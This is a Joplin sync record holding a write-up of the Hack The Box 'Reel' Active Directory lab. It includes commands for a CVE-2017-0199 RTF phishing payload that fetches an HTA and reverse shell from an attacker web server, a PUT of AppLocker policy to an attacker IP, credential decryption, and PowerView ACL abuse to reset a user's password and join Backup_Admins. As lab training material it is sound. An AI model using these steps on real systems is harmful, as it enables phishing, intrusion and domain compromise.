id: db38b6591388475391e59d95d251b62f
parent_id: 
item_type: 1
item_id: f21c6f5f2f59420ca228482d82081874
item_updated_time: 1642607794395
title_diff: "[{\"diffs\":[[1,\"Reel (AD)\"]],\"start1\":0,\"start2\":0,\"length1\":0,\"length2\":9}]"
body_diff: "[{\"diffs\":[[1,\"## Nmap Scripts\\\n\\\n> nmap -sC -sV -oA nmap/reel 10.10.10.77\\\n\\\n![260d2a8d8eefbb8c2dff61fb2aca7a14.png](:/5878cfea59d54811b41b076abb4d3602)\\\n\\\nAnonymous document in ftp is allowed, and there is a documents directory\\\n\\\nOpenSSH usually is not in Windows, so might be a VM\\\n\\\nPort 25 has SMTP which shows there are some enumerations being done to the server\\\n\\\nMain discovery was that when HELLO was sent, there was a response, but when EHLO (Extended Hello) was sent, it responded Invalid ==> can conclude to be smtp\\\n\\\nRPC 'junk', 2012 R2 standard -- cannot use ethernalblue\\\n\\\n![71cd91acec0aa704cad95af9bd14d2bc.png](:/9ff6fb97d14846d6b013a392b46bf640)\\\n\\\nClock-skew - not much skew.\\\n\\\nSMB shown to have guest\\\n\\\n![dcf033710c274d177ba5a9b5d4e13288.png](:/af6a3c9d0c8142e0bbff4c2db107e982)\\\n\\\nA ping to the machine shows 127, which is the normal TTL rate for Windows\\\n\\\nIf it is a Linux Machine, the TTL will be 64, 254 is a CISCO machine\\\n\\\n## CHeck on FTP\\\n\\\nftp into the server and use anonymous account with a random password\\\n\\\n![36740fe6b29f43313bd5f13b7de4ed89.png](:/8fa9e06afea74e1693e5e49f4b1e6f60)\\\n\\\nTo download all the files inside, use\\\n\\\n> mget *\\\n\\\nRead the readme.txt - hints to be a phishing form of exercise\\\n\\\n![2eb17218aff43369f086c6d01dc10d7a.png](:/20f9b697e7174e89a2efa69f65f25e0c)\\\n\\\nUse Exiftool to check what kind of document is the .docx file![3318a1d76250c3faa293e408b79bf65b.png](:/ecb0d10cc3f249b78c648d9c577c3681)\\\n\\\nCheck on the other docx file, the windows event forwarding, and found an email address in the Creator parameter\\\n\\\n![a7f0897b33bb4ef071ff85736d800cf6.png](:/91c25a131d65407db7bf0beb1c118399)\\\n\\\n## Check if Email address is valid with Mail Server (SMTP)\\\n\\\n> telnet 10.10.10.77 25\\\n\\\nThen key in the following to craft a message and to do a verification\\\n\\\n![7bfde80bac77c4096df78b418b5e08f8.png](:/9238cb70035a4a9ea186ce1870562444)\\\n\\\nThe domain of the mail server is able to verify users within the domain, but if the domain is out of the user's context, then we won't be able to know how to verify, and the mail server will just accept it\\\n\\\n## Look into the Word Documents with libreoffice\\\n\\\n![536b5c16a6d7656dd9bb04f72a232539.png](:/ff04b9a1727e4f26a3034428f289019c)\\\n\\\nWe will not be able to use powershell for example, as there are hash rules for those kind of files due to AppLocker\\\n\\\n## Create a Canary Document to test if the document will be open by receiving end\\\n\\\n![0528fd13cb502dc72faf7e1a13d70cd0.png](:/7f40be8f079f40c98fe618c92754fcdc)\\\n\\\nGo into Insert Tab => Quick Parts => Field => IncludePicture under Links and References - key in the destination you want\\\n\\\nIf someone downloads and opens the file, it should have a response on the server. Unless the server has something like e.g. Powershell script that is blocked and requires to \\\"Enable Macros...\\\", or something that blocks, then we won't have a response.\\\n\\\nCanary images is very good as it operates before the macro -- this doesn't work as the person is not using office, so no response\\\n\\\n## Create Exploit RTF document\\\n\\\nSearched online for a RTF exploit and found 2017-0199\\\n\\\n> git clone https://github.com/bhdresh/CVE-2017-0199\\\n> \\\n> python cve-2017-0199_toolkit.py -M gen -w ippsec.rtf -u ['http://10.10.14.17/PleaseSubscribe.hta'](http://10.10.14.17) -t RTF -x 0\\\n\\\nOnce the RTF file is generated, then we look into powershell scripts in Nishang\\\n\\\nFind the Out-HTA file and generate the HTA file. For example\\\n\\\n![72cc32015c066ceec55650a725629e34.png](:/1748cfb66fe0403fb6573264aefc6df0)\\\n\\\nMove the HTA file to a folder where the webserver will be started\\\n\\\nThen copy the reverse shell into the same folder as well\\\n\\\n![2d96a040044ace0217b50f7777e6caf2.png](:/342da7e2b92a416e882d56f9843fa75d)\\\n\\\nModify the reverse shell ps1 script to call the reverse shell script at the end of the file\\\n\\\n![83b6ad8e99935ad466beea165466b0e4.png](:/fcc16da1bf054347a270a09779feae92)\\\n\\\nThen start the web server\\\n\\\n> python -m SimpleHTTPServer 80\\\n\\\nDo a netcat listener\\\n\\\n> nc -nlvp 9001\\\n\\\nSend the email within the webserver directory (Where the rtf file is located)\\\n\\\n![57adda8cd2c98e8c38c41369621865a4.png](:/a0ab26b867034341871e37bfb8d458a1)\\\n\\\nYou should get a response on the web Server\\\n\\\n![da9200ead64be6c175ec51877b64b94f.png](:/1e59f3941ffe4b5188f86232809f1358)\\\n\\\nHTA file did not execute, because there were no quotes when generating the RTF file\\\n\\\n![9ca415b463c45b815d31b4164ae30fcd.png](:/f994bf31080443fcac7103285c736313)\\\n\\\nNo we have a shell\\\n\\\n## Check AppLocker Policies\\\n\\\n> $output = Get-ApplockerPolicy -Effective -xml; Invoke-RestMethod -Method PUT -Body $outfile -Uri http://IP/App.xml\\\n\\\n![30bc02a454a3b094b0c304daf3120303.png](:/ad58aa1cf2b040179140744b6eb1dde7)\\\n\\\nOpening the file in Firefox will give a weird XML error\\\n\\\nCopied the whole text out of the AppLocker Policy, and create the file on your kali instead\\\n\\\n![49555d94061b1d2e009b6544eb73c40e.png](:/ec4547e581f243c5874bebec7f964c87)\\\n\\\nDLLs are not configured; You can always use DLL\\\n\\\nScripts, you can find the exceptions\\\n\\\n![36f897eeb17edb241d0c259df278bc59.png](:/1818706e094146d59266d5fc69c75e93)\\\n\\\n## Check What Services are running\\\n\\\n> Get-Service | where {$_.Status -eq \\\"Running\\\" }\\\n\\\n![cec7c37445e3e544e14f44b252be8b2b.png](:/56ff158503444807b10a72cc75796f70)\\\n\\\nCan confirm that ssh is running on Windows\\\n\\\n## Check on users Directory\\\n\\\n![a84a381e54668812b89c279689ce2bac.png](:/e7b46399bbbc4c768567eff735a8281a)\\\n\\\nGo into nico and Desktop, and we can find the user.txt file\\\n\\\n![4067fdcac50069bbdc83af54ad9d95bb.png](:/0b1e30388b68445da31f63dd1ff08e67)\\\n\\\nThere is a cred.xml file as well. looking at it, we obtain a user and password\\\n\\\n![e58a7ab1a5a4e603cceacaf69e0721b4.png](:/a336eeb1d9bc4b31925f7b12188d5e19)Store the credentials in an Object that is related to the System.Management.Automation.PSCredential\\\n\\\n![ae4d962dd101b8c2e63d29da735b18dc.png](:/d419173dbd7c4a4e98586a768edc93dc)\\\n\\\nTo read the credential - use the object with GetNetworkCredential()\\\n\\\n![72bfb48c092d13b00564222143aa5f38.png](:/c3f942feb6574ee998ce4581ac421bcc)\\\n\\\nSince we know there is a SSH service, we can use the credentials to login and get a proper command prompt\\\n\\\n![f4e6e236be4ae1f63ffbf8158d9cdb5d.png](:/e2c5ed443e8344b5bd02fb50ddd7c537)\\\n\\\n## Enumerate Items in Tom Shell\\\n\\\nOn the Desktop, there is a BloodHound, and a note, which states that no AD attack paths from user to Domain Admin, and they should re-run Cypher query against other groups created\\\n\\\n![21a62d8b3fcf4e2a2bdb642fa6f16450.png](:/c0a6aa3e7c4b40b5bbffb77fdd9d3f2c)\\\n\\\nYou can also download BloodHound and run it in nico as well\\\n\\\n> Invoke-Bloodhound -CollectionMethod All\\\n\\\n![2abf12396c6896220a218cff5778ac6f.png](:/92ef8c85114742ba9d1383c73a7b2992)We then transfer the zip file to Kali\\\n\\\n**![d9a259b42a659c65f93daaf1486a5287.png](:/09675b14938e4ce99555225587e8cb4e)**\\\n\\\n## **Use BloodHound to understand the json files obtained**\\\n\\\nSetup BloodHound (If you haven't, by setting up the neo4j), and run BloodHound, then drag the zip file into the program\\\n\\\n![d8ea38335d8e3a1449c1c1bb3b0a2094.png](:/c018a408cb69452888111152a8913d01)\\\n\\\nIf we look into \\\"Shortest Paths to High Value Targets\\\", we know that Nico and Tom are connected to Print Operators group, which there is a way to do Priv Esc to get admin\\\n\\\nTry to look for Groups that Bloodhound is not aware of\\\n\\\n> net groups /domain\\\n\\\n![87cd7b96f679b03aed98527b032b97d2.png](:/0c697e25d80746ee963c2e83b726b5fd)What we notice is that there is a group \\\"Backup Admins\\\" That was not shown in BloodHound. So we search in BloodHound to see Backup Admins relation to Nico\\\n\\\n![20cfeb5764d0ba680f0cfaffd99f9b29.png](:/c7575e4ef4cb4f3f9f3e098d62dc22c5)So there is a relationship based on a writeowner adsecurity. You can google for more information\\\n\\\n## Will need to use PowerView to exploit\\\n\\\nDownload powerview from web server\\\n\\\nUse the function Set-DomainObjectOwner to be owner of Herman\\\n\\\n> Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico\\\n\\\nThen obtain all the rights and permissions to Herman\\\n\\\n> Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity nico -Rights ResetPassword -Verbose\\\n\\\nCreate new password for Herman\\\n\\\n> $pass = ConvertTo-SecureString 'PleaseSubscribe!' -AsPlainText -Force\\\n> \\\n> Set-DomainUserPassword Herman -AccountPassword $pass -Verbose\\\n\\\nAttempt to login with Herman using SSH and you are able to login; Use PowerView ability Get-DomainGroup to view group membership\\\n\\\nIf we use Nico and check on the Groups Herman is in, you will not see backup admins\\\n\\\n![97a8b9a4d800a9a07d88ab3a87afb2d4.png](:/2993904f26044af3824946238f98bd78)\\\n\\\nNow we add Herman into the backup domain group\\\n\\\n> $cred = New-Object System.Management.Automation.PSCredential('HTB\\\\\\\\Herman', $pass)\\\n> \\\n> Add-DomainGroupMember -Identity 'Backup_Admins' -Members Herman -Credential $cred\\\n\\\n![13a6499fd11154c334afd90775a8054b.png](:/9099b5055e4447dbbb0af140ac3fab59)\\\n\\\nNow we are able to see administrators folders and get the proof in desktop, but we will get access denied\\\n\\\n![8cb6c411b5bc5c515d44b45215c97381.png](:/6e9584ba97a9417094f4464b6f22c4e1)\\\n\\\n## Enumerate Desktop\\\n\\\nThere is a backup scripts folder; We can enumearte the folder for password\\\n\\\n> type * | findstr password \\\n\\\n![30631f26622b8390c5d7a015c29e37da.png](:/2bb7d520a196452a80d9a64ebb6ca1f2)\\\n\\\nTest Administrator SSH login and can read root\\\n\\\n![764326d6890aafeb207acc1ecb254f0c.png](:/8a06495797a646e0a36197fef45fabb4)\"]],\"start1\":0,\"start2\":0,\"length1\":0,\"length2\":9236}]"
metadata_diff: {"new":{"id":"f21c6f5f2f59420ca228482d82081874","parent_id":"3305ced1fb6949afa3e15d5355c1c230","latitude":"0.00000000","longitude":"0.00000000","altitude":"0.0000","author":"","source_url":"","is_todo":0,"todo_due":0,"todo_completed":0,"source":"joplin-desktop","source_application":"net.cozic.joplin-desktop","application_data":"","order":0,"markup_language":1,"is_shared":0,"share_id":"","conflict_original_id":"","master_key_id":""},"deleted":[]}
encryption_cipher_text: 
encryption_applied: 0
updated_time: 2022-02-28T02:44:25.856Z
created_time: 2022-02-28T02:44:25.856Z
type_: 13